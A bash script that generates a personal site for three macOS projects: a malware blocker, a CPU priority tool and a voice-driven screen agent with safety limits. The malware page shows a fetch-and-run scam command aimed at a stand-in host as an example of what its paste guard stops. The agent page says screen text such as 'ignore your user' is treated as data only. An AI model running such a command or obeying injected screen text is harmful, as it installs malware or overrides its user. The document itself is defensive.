#!/bin/bash
# Builds the three pages from shared header and footer.
cd "$(dirname "$0")"
H='<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,300..600,0..100,0..1&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Sans:wght@400;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="/style.css?v=8">'
TOP='<div class="wrap"><header class="top"><a class="name" href="/">Reed Ostrov</a><a class="mute mono" href="https://github.com/Questboy23">github &#8599;</a></header>'
FOOT='<footer><span>Reed Ostrov &middot; made in Ohio</span><span>free &amp; open source &middot; macOS</span></footer></div></body></html>'

cat > index.html <<EOF
$H<title>Reed Ostrov</title><meta name="description" content="Reed Ostrov's projects: free, open source tools for the Mac."></head><body>$TOP
<main class="home"><h1 class="label">Projects</h1><div class="grid">
<a class="card glass lev" href="/leviathan/"><span class="icon lev"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3zm-1.2 14.2-3.5-3.5 1.4-1.4 2.1 2.1 4.9-4.9 1.4 1.4-6.3 6.3z"/></svg></span><h2>Leviathan</h2><p>Stops malware on your Mac before it runs.</p><span class="pill">Learn more &rarr;</span></a>
<a class="card glass am" href="/activity-monitored/"><span class="icon am"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 4a10 10 0 0 0-10 10c0 1.7.4 3.3 1.2 4.7l1.7-1A8 8 0 1 1 20 14c0 1.4-.4 2.7-1 3.8l1.7 1A10 10 0 0 0 12 4zm4.2 4.4-5.6 4.4a2 2 0 1 0 2.8 2.8l2.8-7.2z"/></svg></span><h2>Activity Monitored</h2><p>Keeps your Mac fast when it is overloaded.</p><span class="pill">Learn more &rarr;</span></a>
<a class="card glass" href="/voice-computer-agent/"><span class="icon" style="background:#2f9e57"><svg viewBox="0 0 24 24" fill="#f8f2e6"><path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.9V21h2v-3.1a7 7 0 0 0 6-6.9h-2z"/></svg></span><h2>Voice Computer Agent</h2><p>Tell your Mac what to do, and it does it.</p><span class="pill">Learn more &rarr;</span></a>
</div></main>$FOOT
EOF

cat > leviathan/index.html <<EOF
$H<title>Leviathan</title><meta name="description" content="Leviathan protects a Mac from malware sites, harmful downloads and dangerous pasted commands."></head><body>$TOP
<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--sea)"></i>Project 01 &middot; macOS &middot; v2.0</div><h1 class="serif" style="margin-top:16px">Leviathan</h1><p class="lede serif">It stops malware on your Mac before the malware can run.</p>
<div class="actions"><a class="btn" href="https://github.com/Questboy23/leviathan/releases/latest/download/Leviathan.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/leviathan">View the code</a></div></div>
<figure class="win" aria-label="Example of the paste guard"><div class="bar"><i></i><i></i><i></i><span>Terminal</span></div><pre class="scr"><span class="dim">$</span> curl -s evil.example/fix | bash
<b>Leviathan stopped this command.</b>
It downloads a program and runs it
straight away. Scam pages ask for this.
<span class="dim">Press Enter again to run it anyway.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>Most Mac infections start in one of three ways: a fake website, a file you download, or a command a scam page talks you into pasting into Terminal. Antivirus apps usually scan files after they arrive. Leviathan also stands guard at the other two doors.</p><p>It runs quietly in the background. After a one minute setup there is nothing to click and nothing to keep up to date. When it does step in, it tells you in plain words what it found and why, and it keeps a record so you can reverse the action later.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<h4>1. Bad websites never load</h4><p>Every time your Mac looks up a website address, Leviathan checks it against two public lists of malware and phishing sites, refreshed every hour. Known bad addresses simply fail to load. Lookups travel encrypted to security focused services (Quad9 and Cloudflare), so your network provider cannot read them. Big shared sites such as Google Docs, Dropbox and GitHub are never blocked, even if one bad link is hosted there. If you join hotel or campus Wi-Fi with a sign-in page, it steps aside so you can log in.</p>
<h4>2. Harmful downloads get locked away</h4><p>New files in Downloads and new apps are checked with the same malware rules Apple ships in macOS, plus Apple&rsquo;s list of developers it has banned. A match moves to a locked folder where it cannot open. Nothing is deleted.</p>
<h4>3. Sneaky startup items get switched off</h4><p>Some malware hides by adding itself to the list of programs that start when you log in, often pretending to be part of macOS. Leviathan looks for those disguises and turns them off.</p>
<h4>4. Dangerous pasted commands get paused</h4><p>A popular scam shows a fake error and asks you to paste a line into Terminal to &ldquo;fix&rdquo; it. That line installs malware. Leviathan recognises these commands, stops them once and explains the risk. If you really meant it, pressing Enter again runs it.</p>
<h4>5. A shield in your menu bar</h4><p>A small shield sits next to Wi-Fi and the battery. Pick a protection level from 1 to 5, and flip a switch when you are doing something risky: handling crypto, opening an app from an unknown source, using Tor, or running AI agents. Each switch turns on the guards that fit, such as warning you when a copied wallet address gets swapped, opening an untrusted app in a sealed sandbox, or pausing every AI agent with one click.</p></div></section>

<section class="blk glass"><h3 class="serif">Why it&rsquo;s useful</h3><ul class="pros">
<li><span class="k">01</span><div><b>Covers the tricks antivirus misses</b><span>Fake sites and pasted commands are how most Mac malware spreads today.</span></div></li>
<li><span class="k">02</span><div><b>Every action can be undone</b><span>Each step is written to a tamper checked log, and <code>leviathan undo</code> puts any file or setting back.</span></div></li>
<li><span class="k">03</span><div><b>Private by design</b><span>No account, no tracking, and nothing about you is sent anywhere.</span></div></li>
<li><span class="k">04</span><div><b>Free forever</b><span>No subscription. The full source code is public.</span></div></li>
</ul></section>

<section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
<li><span class="k">2</span><div><b>Open Terminal</b><span>Press Cmd and Space, type Terminal, press Return.</span></div></li>
<li><span class="k">3</span><div><b>Run the installer</b><span>Type <code>bash </code> with a space, drag <code>install.sh</code> from the unzipped folder into the window, and press Return. Enter your Mac password when asked; the website filter needs it once.</span></div></li>
</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>cd ~ &amp;&amp; curl -fsSL https://github.com/Questboy23/leviathan/archive/refs/tags/v2.0.0.tar.gz | tar xz &amp;&amp; bash leviathan-2.0.0/install.sh</code></pre></div></section>
$FOOT
EOF

cat > activity-monitored/index.html <<EOF
$H<title>Activity Monitored</title><meta name="description" content="Activity Monitored keeps a Mac responsive when it is overloaded."></head><body>$TOP
<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:var(--mustard)"></i>Project 02 &middot; macOS</div><h1 class="serif" style="margin-top:16px">Activity Monitored</h1><p class="lede serif">Keeps your Mac quick when too much is running at once.</p>
<div class="actions"><a class="btn" href="https://github.com/Questboy23/activity-monitored/releases/latest/download/Activity-Monitored.zip">Download for Mac <span aria-hidden="true">&darr;</span></a><a class="link" href="https://github.com/Questboy23/activity-monitored">View the code</a></div></div>
<figure class="win" aria-label="Example of Activity Monitored at work"><div class="bar"><i></i><i></i><i></i><span>Activity Monitored</span></div><pre class="scr">Processor  <span class="meter"><i style="width:96%"></i></span> 96%
<b>Busy. Asking 3 background programs to wait.</b>
  backup        lowered
  photo sync    lowered
  updater       lowered
<span class="dim">Back to normal in 90 seconds.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>Your Mac&rsquo;s processor can only do so much at once. When a backup, a photo sync and a software update all run together, they compete with the app you are actually using, and everything starts to stutter: typing lags, videos skip, windows beachball.</p><p>Activity Monitored watches for that moment. When the processor is overloaded, it gently lowers the priority of the busy programs running in the background. They keep working, just a little more politely, and the window in front of you stays smooth. Once things calm down, every program goes back to normal.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<h4>1. It watches the load</h4><p>Every 3 seconds it checks how hard the processor is working and which programs are using it most. If there is spare room, it does nothing at all.</p>
<h4>2. It lowers busy background programs</h4><p>When the Mac is overloaded, it moves the heaviest background programs to macOS&rsquo;s low priority lane, the same one macOS uses for its own background chores. Nothing is closed or paused, and no work is lost.</p>
<h4>3. It always puts things back</h4><p>Every change starts its own 90 second timer that reverses it automatically. The timer runs separately, so even if Activity Monitored crashes or you remove it, your programs still return to normal. Every change is also written to a log you can read.</p></div></section>

<section class="blk glass"><h3 class="serif">Why it&rsquo;s useful</h3><ul class="pros">
<li><span class="k">01</span><div><b>The app you&rsquo;re using stays smooth</b><span>Typing, scrolling and video keep up even while heavy work runs behind them.</span></div></li>
<li><span class="k">02</span><div><b>Heavy jobs can even finish sooner</b><span>In one overload test on one Mac, a 10 program job finished in 24 seconds instead of 39.</span></div></li>
<li><span class="k">03</span><div><b>Nothing is ever closed</b><span>Programs are only slowed for a moment. They keep running and keep their work.</span></div></li>
<li><span class="k">04</span><div><b>Free, private, no account</b><span>No subscription, no sign up, and no data leaves your Mac.</span></div></li>
</ul></section>

<section class="blk glass"><h3 class="serif">How to install</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download</b><span>Click Download for Mac above. Your Mac unzips it into Downloads.</span></div></li>
<li><span class="k">2</span><div><b>Open the installer</b><span>In the unzipped folder, right click <code>Install Activity Monitored.command</code> and choose Open.</span></div></li>
<li><span class="k">3</span><div><b>That&rsquo;s it</b><span>It starts now and every time you log in. If your Mac offers to install developer tools, click Install, then repeat step 2.</span></div></li>
</ol><p class="note">Or paste this single line into Terminal:</p><pre><code>curl -fsSL https://raw.githubusercontent.com/Questboy23/activity-monitored/main/install.sh | bash</code></pre></div></section>
$FOOT
EOF

mkdir -p voice-computer-agent
cat > voice-computer-agent/index.html <<EOF
$H<title>Voice Computer Agent</title><meta name="description" content="Tell your Mac what to do. Voice Computer Agent does it on screen while you watch, or in the background while you sleep, inside hard limits you set."><style>.vt{width:100%;border-collapse:collapse;font-size:15px}.vt th,.vt td{text-align:left;padding:10px 8px;border-bottom:1px solid rgba(128,128,128,.25);vertical-align:top}.vt th{font-weight:600}.dia{width:100%;height:auto;display:block;margin-top:8px}.dia text{font:13px "Instrument Sans",sans-serif;fill:currentColor}.dia .s{font-size:11px;opacity:.75}.dia rect{fill:none;stroke:currentColor;stroke-opacity:.45;rx:10}.dia .g{stroke:#3fbf6a;stroke-opacity:.9}.dia path{stroke:currentColor;stroke-opacity:.5;fill:none;marker-end:url(#ar)}pre{overflow-x:auto}</style></head><body>$TOP
<nav class="crumb"><a class="back" href="/"><span aria-hidden="true">&larr;</span> All projects</a></nav>
<section class="p-hero split glass"><div><div class="label"><i class="dot" style="background:#3fbf6a"></i>Project 03 &middot; macOS &middot; in testing</div><h1 class="serif" style="margin-top:16px">Voice Computer Agent</h1><p class="lede serif">Tell your Mac what to do. It does it on screen while you watch, or in the background while you sleep.</p>
<p class="note">Not released yet. It is being tested on one Mac, and the download goes here when it is ready.</p></div>
<figure class="win" aria-label="Example of the agent at work"><div class="bar"><i></i><i></i><i></i><span>Voice Computer Agent</span></div><pre class="scr"><span class="dim">You (holding Right Option):</span> get me to my Chrome extensions
<b>Step 1  click  the puzzle piece icon</b>
<b>Step 2  click  Manage extensions</b>
<span class="dim">Done in 2 steps. Replays free next time.</span></pre></figure></section>

<section class="blk glass"><h3 class="serif">What it does</h3><div class="prose"><p>You hold a key and say what you want, such as &ldquo;get me to my Chrome extensions&rdquo; or &ldquo;what should I do next on this page&rdquo;. You can also type the goal into a box. The agent looks at your screen, picks one step, does it, looks again, and repeats until the job is finished.</p><p>It can point while you click, click for you while you watch, or work in the background inside limits you set before bed. A very faint green glow around the edge of the screen shows it is on. Press Escape and it stops at once.</p></div></section>

<section class="blk glass"><h3 class="serif">How it works</h3><div class="prose feats">
<p>The whole agent is one function called again and again: <code>next_action(goal, screen)</code>. It takes your goal and the current screen and returns exactly one action, such as &ldquo;click here&rdquo;, &ldquo;type this&rdquo; or &ldquo;done&rdquo;.</p>
<h4>1. You give a goal</h4><p><b>In:</b> your voice while you hold Right Option, or text in the goal box. <b>Out:</b> one line of text. Speech becomes text on your Mac with whisper.cpp. The microphone is only on while you hold the key.</p>
<h4>2. It looks at the screen</h4><p><b>In:</b> the screen. <b>Out:</b> one small screenshot, kept in memory and never saved, plus the names of the buttons and fields macOS reports. Text on the screen is treated as data only. A web page that says &ldquo;ignore your user&rdquo; gets no say.</p>
<h4>3. It picks one action</h4><p><b>In:</b> the goal and the screen. <b>Out:</b> one action in a strict format. Any reply that is not exactly one valid action is thrown away. Free mode asks a model on your Mac. Claude mode asks Claude.</p>
<h4>4. Safety check</h4><p><b>In:</b> the action and what is on screen. <b>Out:</b> go, ask first, or blocked. Sending, deleting and settings changes need your yes. Password fields, payment fields, password managers, Keychain, System Settings and banking sites are always off limits.</p>
<h4>5. It acts</h4><p><b>In:</b> an approved action. <b>Out:</b> a mouse click, keystrokes or a scroll. In guide mode it only draws a ring around the spot, and the up and down arrow keys step through the plan. In background mode it presses buttons inside one app without moving your mouse.</p>
<h4>6. It remembers what worked</h4><p>When a task succeeds, its steps are saved. Next time it replays them with no AI calls. Before each replayed step it checks that the screen still matches. Anything you typed is never saved.</p>
<svg class="dia" viewBox="0 0 760 300" role="img" aria-label="Diagram: push-to-talk mic or goal box gives a goal; screen capture and accessibility give the screen; next_action uses a local model or Claude; the safety gate passes actions to mouse and keyboard or to background press; a separate watchdog listens for Escape and stops everything; the replay cache skips the model for known tasks."><defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0L10 5L0 10z" fill="currentColor" stroke="none"/></marker></defs>
<rect x="10" y="20" width="150" height="54"/><text x="22" y="43">Push-to-talk mic</text><text class="s" x="22" y="62">or typed goal box</text>
<rect x="10" y="110" width="150" height="54"/><text x="22" y="133">Screen capture</text><text class="s" x="22" y="152">+ button names (AX)</text>
<rect x="215" y="62" width="170" height="60" class="g"/><text x="228" y="86">next_action(goal, screen)</text><text class="s" x="228" y="106">returns one action</text>
<rect x="215" y="160" width="80" height="54"/><text x="225" y="183">Local model</text><text class="s" x="225" y="201">free mode</text>
<rect x="305" y="160" width="80" height="54"/><text x="315" y="183">Claude</text><text class="s" x="315" y="201">Claude mode</text>
<rect x="430" y="62" width="130" height="60"/><text x="442" y="86">Safety gate</text><text class="s" x="442" y="106">go / ask / block</text>
<rect x="605" y="20" width="145" height="54"/><text x="617" y="43">Mouse + keyboard</text><text class="s" x="617" y="62">auto mode</text>
<rect x="605" y="96" width="145" height="54"/><text x="617" y="119">Ring + arrow keys</text><text class="s" x="617" y="138">guide mode</text>
<rect x="605" y="172" width="145" height="54"/><text x="617" y="195">Press inside one app</text><text class="s" x="617" y="214">background mode</text>
<rect x="430" y="160" width="130" height="54"/><text x="442" y="183">Replay cache</text><text class="s" x="442" y="201">no AI calls</text>
<rect x="10" y="236" width="740" height="52" class="g"/><text x="22" y="258">Watchdog: separate process with its own Escape listener</text><text class="s" x="22" y="277">kills the agent, clears the queue, removes the green glow. The agent cannot press Escape or change its own settings.</text>
<path d="M160 47 L213 80"/><path d="M160 137 L213 104"/><path d="M265 122 L258 158"/><path d="M335 122 L342 158"/><path d="M385 92 L428 92"/><path d="M560 80 L603 50"/><path d="M560 92 L603 120"/><path d="M560 104 L603 195"/><path d="M495 160 L495 124"/></svg></div></section>

<section class="blk glass"><h3 class="serif">Three ways to use it</h3><div class="prose feats">
<h4>Guide: it points, you click</h4><p>A ring shows what to click next. Up and down arrows step forward and back. Nothing is clicked for you.</p>
<h4>Auto: it clicks while you watch</h4><p>It moves the mouse and types on your screen. A faint green glow sits around the screen edge the whole time.</p>
<h4>Overnight: full control inside hard limits</h4><p>Before bed you list the jobs and set the limits: hours, AI tokens and steps. You type GRANT to confirm. It works through the list, in the background inside one app if you choose. While it works in the background, the green glow slowly breathes and a small label at the top says &ldquo;Working in background&rdquo; with the app&rsquo;s name. Anything that needs your yes, such as sending or deleting, waits in a list for the morning unless you allowed it.</p>
<pre><code>vca grant --goal "sort my Downloads folder into folders" --goal "draft replies to unread mail" --hours 8 --max-tokens 200000 --app Mail
vca overnight
vca held      # in the morning: what waited for you
vca revoke    # cancel the grant at any time</code></pre>
<p>These limits hold in every mode and no setting can turn them off: it never spends money (no buying, paying, checkout, subscribing, donating, transfers or adding cards), never types into password or payment fields, never touches password managers, Keychain, System Settings or banking sites, and never presses Escape or changes its own settings. A grant lasts at most 12 hours.</p></div></section>

<section class="blk glass"><h3 class="serif">Free mode and Claude mode</h3><table class="vt"><tr><th></th><th>Free mode</th><th>Claude mode</th></tr>
<tr><td>Where the AI runs</td><td>On your Mac (Ollama, Qwen 3.5 9B)</td><td>Anthropic&rsquo;s servers (Claude Sonnet)</td></tr>
<tr><td>What leaves your Mac</td><td>Nothing. Tested with the internet blocked.</td><td>One shrunken screenshot and the button names per step</td></tr>
<tr><td>Cost</td><td>&#36;0</td><td>Pay per use on your own Anthropic API key</td></tr>
<tr><td>Speed per step</td><td>7 to 15 seconds once loaded (first call 83 s)</td><td>Not measured yet</td></tr>
<tr><td>Best for</td><td>Simple, repeated tasks and private screens</td><td>Harder, unfamiliar tasks</td></tr></table>
<p class="note">Other AI companies can plug in through the same provider interface: one class with one method.</p></section>

<section class="blk glass"><h3 class="serif">Connecting it to Claude</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Get an API key</b><span>Sign in at console.anthropic.com, open API Keys, and create a key.</span></div></li>
<li><span class="k">2</span><div><b>Store it in your Keychain</b><span>Paste this into Terminal. It asks for the key, which never goes into a file or a log: <code>security add-generic-password -s voice-computer-agent-anthropic -a me -w</code></span></div></li>
<li><span class="k">3</span><div><b>Say yes once</b><span>The first Claude-mode run explains what is sent and asks for your consent. Free mode never asks, because nothing leaves your Mac.</span></div></li>
<li><span class="k">4</span><div><b>Run it</b><span><code>vca run --provider claude --mode auto --goal "get me to my Chrome extensions"</code></span></div></li></ol></div></section>

<section class="blk glass"><h3 class="serif">How to install (once released)</h3><div><ol class="steps">
<li><span class="k">1</span><div><b>Download and unzip</b><span>The download button appears at the top of this page at release.</span></div></li>
<li><span class="k">2</span><div><b>Install the free AI</b><span>Install Ollama from ollama.com, then run <code>ollama pull qwen3.5:9b</code> (about 8 GB).</span></div></li>
<li><span class="k">3</span><div><b>Allow two permissions</b><span>In System Settings, Privacy &amp; Security, turn on Accessibility and Screen Recording for the app. It asks for nothing else.</span></div></li>
<li><span class="k">4</span><div><b>Check it</b><span>Run <code>vca doctor</code>. It lists anything still missing.</span></div></li>
<li><span class="k">5</span><div><b>Go</b><span>Hold Right Option and speak, or run <code>vca run --box</code> to type a goal.</span></div></li></ol></div></section>

<section class="blk glass"><h3 class="serif">Measured so far</h3><ul class="pros">
<li><span class="k">01</span><div><b>127 automated tests pass</b><span>Covering the action format, safety checks, money block, overnight limits, kill switch and replay cache. 2 more need screen permission and were skipped.</span></div></li>
<li><span class="k">02</span><div><b>Escape: 0 actions after 20 of 20 stops</b><span>Measured through the agent&rsquo;s real event path. A real Escape key press has not been tested yet.</span></div></li>
<li><span class="k">03</span><div><b>Free mode works offline</b><span>With all internet blocked, the local model returned a valid action 3 of 3 times, about 260 tokens each.</span></div></li>
<li><span class="k">04</span><div><b>Not measured yet</b><span>Success rate on real everyday tasks. That needs 10 real tasks per mode on a Mac with the permissions granted.</span></div></li>
</ul></section>
<footer><span>Reed Ostrov &middot; made in Ohio</span><span>free mode costs nothing &middot; macOS</span></footer></div></body></html>
EOF
